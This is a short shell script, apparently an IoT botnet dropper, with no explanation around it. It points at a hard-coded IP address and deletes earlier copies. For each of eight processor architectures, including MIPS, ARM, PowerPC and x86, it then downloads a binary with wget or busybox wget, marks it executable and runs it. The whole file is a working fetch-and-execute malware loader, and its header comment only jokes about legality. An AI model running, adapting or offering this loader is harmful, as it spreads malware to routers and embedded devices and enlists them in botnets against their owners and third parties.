#!/bin/sh
# THIS SCRIPT IS TOTALLY NOT ILLEGAL

REFERENCE_HTTP="http://188.166.232.17"

REFERENCE_MIPSEL="jackmymipsel"
REFERENCE_MIPS="jackmymips"
REFERENCE_SUPERH="jackmysh4"
REFERENCE_ARM="jackmyarmv6"
REFERENCE_PPC="jackmypowerpc"
REFERENCE_I686="jackmyi686"
REFERENCE_I586="jackmyi586"
REFERENCE_X86="jackmyx86"

rm -fr ${REFERENCE_MIPSEL} \
	${REFERENCE_MIPS} \
	${REFERENCE_SUPERH} \
	${REFERENCE_ARM} \
	${REFERENCE_PPC} \
	${REFERENCE_I686} \
	${REFERENCE_I586} \ 
    ${REFERENCE_X86} 

wget -q ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} && chmod +x ${REFERENCE_MIPSEL} || busybox chmod +x ${REFERENCE_MIPSEL} && ./${REFERENCE_MIPSEL}
wget -q ${REFERENCE_HTTP}/${REFERENCE_MIPS} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_MIPS} && chmod +x ${REFERENCE_MIPS} || busybox chmod +x ${REFERENCE_MIPS} && ./${REFERENCE_MIPS}
wget -q ${REFERENCE_HTTP}/${REFERENCE_ARM} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_ARM} && chmod +x ${REFERENCE_ARM} || busybox chmod +x ${REFERENCE_ARM} && ./${REFERENCE_ARM}
wget -q ${REFERENCE_HTTP}/${REFERENCE_PPC} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_PPC} && chmod +x ${REFERENCE_PPC} || busybox chmod +x ${REFERENCE_PPC} && ./${REFERENCE_PPC}
wget -q ${REFERENCE_HTTP}/${REFERENCE_SUPERH} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_SUPERH} && chmod +x ${REFERENCE_SUPERH} || busybox chmod +x ${REFERENCE_SUPERH} && ./${REFERENCE_SUPERH}
wget -q ${REFERENCE_HTTP}/${REFERENCE_I686} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_I686} && chmod +x ${REFERENCE_I686} || busybox chmod +x ${REFERENCE_I686} && ./${REFERENCE_I686}
wget -q ${REFERENCE_HTTP}/${REFERENCE_I586} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_I586} && chmod +x ${REFERENCE_I586} || busybox chmod +x ${REFERENCE_I586} && ./${REFERENCE_I586}
wget -q ${REFERENCE_HTTP}/${REFERENCE_X86} || busybox wget -q ${REFERENCE_HTTP}/${REFERENCE_X86} && chmod +x ${REFERENCE_X86} || busybox chmod +x ${REFERENCE_X86} && ./${REFERENCE_X86}